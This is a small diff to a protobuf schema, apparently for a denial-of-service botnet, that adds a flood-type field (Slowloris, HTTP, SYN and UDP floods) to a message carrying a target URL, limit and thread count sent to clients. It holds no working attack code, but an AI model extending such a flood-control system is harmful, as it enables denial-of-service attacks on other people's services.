@@ -24,9 +24,10 @@ message Void {}
 
 message FloodData { 
     bool ShouldFlood = 1;
-    string url = 2;
-    int64 limit = 3;
-    int64 num_threads = 4;
+    int32 floodType =2; // 0 = Slowloris, 1 = Httpflood, 2 = Synflood, 3 = Updflood
+    string url = 3;
+    int64 limit = 4;
+    int64 num_threads = 5;
 }
 
 message ClientDataRequest { string client_id = 1; }
